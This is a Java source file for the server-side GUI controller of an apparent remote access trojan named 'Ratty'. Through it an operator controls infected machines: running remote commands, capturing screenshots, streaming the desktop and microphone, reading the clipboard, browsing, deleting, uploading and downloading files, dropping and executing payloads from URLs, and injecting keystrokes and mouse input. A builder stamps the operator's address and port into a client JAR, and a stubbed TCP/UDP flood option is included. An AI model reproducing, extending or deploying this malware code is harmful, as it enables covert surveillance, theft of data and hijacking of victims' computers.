package de.sogomn.rat.server.gui;

import static de.sogomn.rat.Ratty.LANGUAGE;

import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.HashMap;
import java.util.Set;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import de.sogomn.engine.Clock;
import de.sogomn.engine.fx.Sound;
import de.sogomn.engine.util.Scheduler;
import de.sogomn.engine.util.Scheduler.Task;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.builder.JarBuilder;
import de.sogomn.rat.packet.AudioPacket;
import de.sogomn.rat.packet.ChatPacket;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.CreateDirectoryPacket;
import de.sogomn.rat.packet.DeleteFilePacket;
import de.sogomn.rat.packet.DesktopPacket;
import de.sogomn.rat.packet.DownloadFilePacket;
import de.sogomn.rat.packet.DownloadUrlPacket;
import de.sogomn.rat.packet.ExecuteFilePacket;
import de.sogomn.rat.packet.FileRequestPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.PingPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.UploadFilePacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.packet.WebsitePacket;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.util.FrameEncoder.IFrame;

/*
 * Woah, this is a huge class.
 */
public final class RattyGuiController extends AbstractRattyController implements IGuiController {
	
	private ActiveServer server;
	private IRattyGui gui;
	
	private HashMap<ActiveConnection, ServerClient> clients;
	
	private Clock clock;
	private Scheduler scheduler;
	private Task pingTask;
	
	private static final String BUILDER_REPLACEMENT = "connection_data";
	private static final String BUILDER_REPLACEMENT_FORMAT = "%s\r\n%s\r\ntrue";
	private static final String[] BUILDER_REMOVALS = {
		"ping.wav",
		"lato.ttf",
		"gui_tree_icons.png",
		"gui_icon.png",
		"gui_menu_icons.png",
		"gui_category_icons.png",
		"language/lang_bsq.properties",
		"language/lang_de.properties",
		"language/lang_en.properties",
		"language/lang_es.properties",
		"language/lang_nl.properties",
		"language/lang_ru.properties",
		"language/lang_tr.properties",
		"language/lang_uk.properties",
		"language/lang_pl.properties",
		"language/lang_dk.properties",
		"language/lang_it.properties"
	};
	
	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
	private static final String OPTION_YES = LANGUAGE.getString("server.yes");
	private static final String OPTION_CANCEL = LANGUAGE.getString("server.cancel");
	private static final String OPTION_TCP = LANGUAGE.getString("server.tcp");
	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
	private static final String AMOUNT_QUESTION = LANGUAGE.getString("server.amount_question");
	
	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
	private static final float PING_INTERVAL = 3;
	
	private static final Sound PING = Sound.loadSound("/ping.wav");
	
	public RattyGuiController(final ActiveServer server, final IRattyGui gui) {
		this.server = server;
		this.gui = gui;
		
		final Runnable task = () -> {
			final PingPacket packet = new PingPacket();
			
			connections.forEach(connection -> connection.addPacket(packet));
			pingTask.reset();
		};
		final Thread pingThread = new Thread(() -> {
			while (true) {
				clock.update();
			}
		});
		
		clients = new HashMap<ActiveConnection, ServerClient>();
		clock = new Clock();
		scheduler = new Scheduler();
		pingTask = new Task(task, PING_INTERVAL);
		
		pingThread.setDaemon(true);
		pingThread.start();
		
		scheduler.addTask(pingTask);
		clock.addListener(scheduler);
	}
	
	/*
	 * ==================================================
	 * HANDLING COMMANDS
	 * ==================================================
	 */
	
	private PopupPacket createPopupPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final PopupPacket packet = new PopupPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private CommandPacket createCommandPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private WebsitePacket createWebsitePacket() {
		final String input = gui.getInput(URL_MESSAGE);
		
		if (input == null) {
			return null;
		}
		
		final String numberInput = gui.getInput(AMOUNT_QUESTION);
		final int number;
		
		try {
			number = Integer.parseInt(numberInput);
		} catch (final NumberFormatException ex) {
			return null;
		}
		
		final WebsitePacket packet = new WebsitePacket(input, number);
		
		return packet;
	}
	
	private AudioPacket createAudioPacket() {
		final File file = gui.getFile("WAV");
		final AudioPacket packet = new AudioPacket(file);
		
		return packet;
	}
	
	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getNodeClicked();
		final String path = node.getPath();
		final DownloadFilePacket packet = new DownloadFilePacket(path);
		
		return packet;
	}
	
	private UploadFilePacket createUploadPacket(final ServerClient client) {
		final File file = gui.getFile();
		
		if (file != null) {
			final FileTreeNode node = client.fileTree.getNodeClicked();
			final String path = node.getPath();
			final UploadFilePacket packet = new UploadFilePacket(file, path);
			
			return packet;
		}
		
		return null;
	}
	
	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getNodeClicked();
		final String path = node.getPath();
		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
		
		return packet;
	}
	
	private DeleteFilePacket createDeletePacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getNodeClicked();
		final String path = node.getPath();
		final DeleteFilePacket packet = new DeleteFilePacket(path);
		
		return packet;
	}
	
	private CreateDirectoryPacket createFolderPacket(final ServerClient client) {
		final String input = gui.getInput();
		
		if (input != null) {
			final FileTreeNode node = client.fileTree.getNodeClicked();
			final String path = node.getPath();
			final CreateDirectoryPacket packet = new CreateDirectoryPacket(path, input);
			
			return packet;
		}
		
		return null;
	}
	
	private FreePacket createFreePacket() {
		final boolean accepted = gui.showWarning(FREE_WARNING, OPTION_YES, OPTION_CANCEL);
		
		if (accepted) {
			final FreePacket packet = new FreePacket();
			
			return packet;
		}
		
		return null;
	}
	
	private DownloadUrlPacket createDownloadUrlPacket(final ServerClient client) {
		final String address = gui.getInput(URL_MESSAGE);
		
		if (address != null) {
			final FileTreeNode node = client.fileTree.getNodeClicked();
			final String path = node.getPath();
			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
			
			return packet;
		}
		
		return null;
	}
	
	private UploadFilePacket createUploadExecutePacket(final ServerClient client) {
		final File file = gui.getFile();
		
		if (file != null) {
			final UploadFilePacket packet = new UploadFilePacket(file, "", true);
			
			return packet;
		}
		
		return null;
	}
	
	private DownloadUrlPacket createDropExecutePacket(final ServerClient client) {
		final String address = gui.getInput(URL_MESSAGE);
		
		if (address != null) {
			final DownloadUrlPacket packet = new DownloadUrlPacket(address, "", true);
			
			return packet;
		}
		
		return null;
	}
	
	private ChatPacket createChatPacket(final ServerClient client) {
		final String message = client.chat.getMessage();
		final ChatPacket packet = new ChatPacket(message);
		
		return packet;
	}
	
	private void toggleDesktopStream(final ServerClient client) {
		final boolean streamingDesktop = client.isStreamingDesktop();
		
		client.setStreamingDesktop(!streamingDesktop);
		gui.update();
	}
	
	private void stopDesktopStream(final ServerClient client) {
		client.setStreamingDesktop(false);
		gui.update();
	}
	
	private void toggleVoiceStream(final ServerClient client) {
		final boolean streamingVoice = client.isStreamingVoice();
		
		client.setStreamingVoice(!streamingVoice);
		gui.update();
	}
	
	private void requestFile(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getNodeClicked();
		final String path = node.getPath();
		final FileRequestPacket packet = new FileRequestPacket(path);
		
		client.fileTree.removeChildren(node);
		client.connection.addPacket(packet);
	}
	
	private void startBuilder() {
		final File destination = gui.getSaveFile("JAR");
		
		if (destination == null) {
			return;
		}
		
		final String address = gui.getInput(BUILDER_ADDRESS_QUESTION);
		
		if (address == null) {
			return;
		}
		
		final String port = gui.getInput(BUILDER_PORT_QUESTION);
		
		if (port == null) {
			return;
		}
		
		final String replacementString = String.format(BUILDER_REPLACEMENT_FORMAT, address, port);
		final byte[] replacementData = replacementString.getBytes();
		
		try {
			JarBuilder.build(destination, BUILDER_REPLACEMENT, replacementData);
			
			for (final String removal : BUILDER_REMOVALS) {
				JarBuilder.removeFile(destination, removal);
			}
		} catch (final IOException ex) {
			gui.showError(BUILDER_ERROR_MESSAGE + "\r\n" + ex.getMessage());
		}
	}
	
	private void launchAttack() {
		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, OPTION_CANCEL);
		
		//AttackPacket packet = null;
		
		if (input == JOptionPane.YES_OPTION) {
			//TCP flood packet
		} else if (input == JOptionPane.NO_OPTION) {
			//UDP flood packet
		}
		
		//broadcast(packet);
	}
	
	private void handleCommand(final ServerClient client, final String command) {
		if (command == RattyGui.FILES) {
			client.fileTree.setVisible(true);
		} else if (command == DisplayPanel.CLOSED) {
			stopDesktopStream(client);
		} else if (command == RattyGui.DESKTOP) {
			toggleDesktopStream(client);
		} else if (command == RattyGui.VOICE) {
			toggleVoiceStream(client);
		} else if (command == RattyGui.ATTACK) {
			launchAttack();
		} else if (command == RattyGui.BUILD) {
			startBuilder();
		} else if (command == FileTree.REQUEST) {
			requestFile(client);
		} else if (command == RattyGui.CHAT) {
			client.chat.setVisible(true);
		} else if (command == RattyGui.CLOSE) {
			server.close();
		}
	}
	
	private IPacket createPacket(final ServerClient client, final String command) {
		IPacket packet = null;
		
		if (command == RattyGui.FREE) {
			packet = createFreePacket();
		} else if (command == RattyGui.POPUP) {
			packet = createPopupPacket();
		} else if (command == RattyGui.CLIPBOARD) {
			packet = new ClipboardPacket();
		} else if (command == RattyGui.COMMAND) {
			packet = createCommandPacket();
		} else if (command == RattyGui.SCREENSHOT) {
			packet = new ScreenshotPacket();
		} else if (command == RattyGui.WEBSITE) {
			packet = createWebsitePacket();
		} else if (command == RattyGui.DESKTOP) {
			packet = new DesktopPacket(true);
		} else if (command == RattyGui.AUDIO) {
			packet = createAudioPacket();
		} else if (command == FileTree.DOWNLOAD) {
			packet = createDownloadPacket(client);
		} else if (command == FileTree.UPLOAD) {
			packet = createUploadPacket(client);
		} else if (command == FileTree.EXECUTE) {
			packet = createExecutePacket(client);
		} else if (command == FileTree.DELETE) {
			packet = createDeletePacket(client);
		} else if (command == FileTree.NEW_DIRECTORY) {
			packet = createFolderPacket(client);
		} else if (command == FileTree.DROP_FILE) {
			packet = createDownloadUrlPacket(client);
		} else if (command == RattyGui.UPLOAD_EXECUTE) {
			packet = createUploadExecutePacket(client);
		} else if (command == RattyGui.DROP_EXECUTE) {
			packet = createDropExecutePacket(client);
		} else if (command == ChatWindow.MESSAGE_SENT) {
			packet = createChatPacket(client);
		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
			packet = client.displayPanel.getLastMouseEventPacket();
		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
			packet = client.displayPanel.getLastKeyEventPacket();
		} else if (command == RattyGui.VOICE && !client.isStreamingVoice()) {
			packet = new VoicePacket();
		}
		
		return packet;
	}
	
	/*
	 * ==================================================
	 * HANDLING PACKETS
	 * ==================================================
	 */
	
	private void showScreenshot(final ServerClient client, final ScreenshotPacket packet) {
		final BufferedImage image = packet.getImage();
		
		client.displayPanel.showImage(image);
	}
	
	private void handleFiles(final ServerClient client, final FileRequestPacket packet) {
		final String[] paths = packet.getPaths();
		
		for (final String path : paths) {
			client.fileTree.addNodeStructure(path);
		}
	}
	
	private void handleDesktopPacket(final ServerClient client, final DesktopPacket packet) {
		if (!client.isStreamingDesktop()) {
			return;
		}
		
		final IFrame[] frames = packet.getFrames();
		final int screenWidth = packet.getScreenWidth();
		final int screenHeight = packet.getScreenHeight();
		final DesktopPacket request = new DesktopPacket();
		
		client.connection.addPacket(request);
		client.displayPanel.showFrames(frames, screenWidth, screenHeight);
	}
	
	private void handleClipboardPacket(final ClipboardPacket packet) {
		final String message = packet.getClipbordContent();
		
		gui.showMessage(message);
	}
	
	private void handleVoicePacket(final ServerClient client, final VoicePacket packet) {
		if (!client.isStreamingVoice()) {
			return;
		}
		
		final Sound sound = packet.getSound();
		final VoicePacket request = new VoicePacket();
		
		client.connection.addPacket(request);
		sound.play();
	}
	
	private void handlePing(final ServerClient client, final PingPacket packet) {
		final long milliseconds = packet.getMilliseconds();
		
		client.setPing(milliseconds);
		gui.update();
	}
	
	private void handleChatPacket(final ServerClient client, final ChatPacket packet) {
		final String message = packet.getMessage();
		final String name = client.getName();
		
		client.chat.addLine(name + ": " + message);
	}
	
	private boolean handlePacket(final ServerClient client, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		boolean consumed = true;
		
		if (clazz == ScreenshotPacket.class) {
			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
			
			showScreenshot(client, screenshot);
		} else if (clazz == FileRequestPacket.class) {
			final FileRequestPacket request = (FileRequestPacket)packet;
			
			handleFiles(client, request);
		} else if (clazz == DesktopPacket.class) {
			final DesktopPacket desktop = (DesktopPacket)packet;
			
			handleDesktopPacket(client, desktop);
		} else if (clazz == ClipboardPacket.class) {
			final ClipboardPacket clipboard = (ClipboardPacket)packet;
			
			handleClipboardPacket(clipboard);
		} else if (clazz == VoicePacket.class) {
			final VoicePacket voice = (VoicePacket)packet;
			
			handleVoicePacket(client, voice);
		} else if (clazz == PingPacket.class) {
			final PingPacket ping = (PingPacket)packet;
			
			handlePing(client, ping);
		} else if (clazz == ChatPacket.class) {
			final ChatPacket chat = (ChatPacket)packet;
			
			handleChatPacket(client, chat);
		} else if (clazz == FreePacket.class) {
			//To prevent shutdown
		} else {
			consumed = false;
		}
		
		return consumed;
	}
	
	/*
	 * ==================================================
	 * HANDLING END
	 * ==================================================
	 */
	
	private ImageIcon getFlagIcon(final String address) {
		try {
			final String requestAddress = FLAG_ADDRESS + address;
			final URL url = new URL(requestAddress);
			final BufferedImage image = ImageIO.read(url);
			final ImageIcon icon = new ImageIcon(image);
			
			return icon;
		} catch (final IOException ex) {
			ex.printStackTrace();
			
			return null;
		}
	}
	
	private void logIn(final ServerClient client, final InformationPacket packet) {
		final String name = packet.getName();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		final String address = client.getAddress();
		final ImageIcon icon = getFlagIcon(address);
		final Notification notification = new Notification(name + " " + address, icon);
		
		client.logIn(name, os, version, icon);
		client.addListener(this);
		
		gui.addClient(client);
		notification.trigger();
		PING.play();
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			final boolean consumed = handlePacket(client, packet);
			
			if (!consumed) {
				packet.execute(connection);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		final ServerClient client = new ServerClient(connection);
		
		super.connected(server, connection);
		
		clients.put(connection, client);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final ServerClient client = getClient(connection);
		
		super.disconnected(connection);
		
		gui.removeClient(client);
		clients.remove(connection);
		
		client.removeListener(this);
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
		client.logOut();
	}
	
	@Override
	public void closed(final ActiveServer server) {
		super.closed(server);
		
		clients.values().forEach(ServerClient::logOut);
		
		System.exit(0);
	}
	
	@Override
	public void userInput(final String command, final Object source) {
		final ServerClient client = (ServerClient)source;
		final IPacket packet = createPacket(client, command);
		
		if (packet != null) {
			client.connection.addPacket(packet);
		}
		
		handleCommand(client, command);
	}
	
	public final ServerClient getClient(final ActiveConnection searched) {
		final Set<ActiveConnection> clientSet = clients.keySet();
		
		for (final ActiveConnection connection : clientSet) {
			if (connection == searched) {
				final ServerClient client = clients.get(connection);
				
				return client;
			}
		}
		
		return null;
	}
	
}
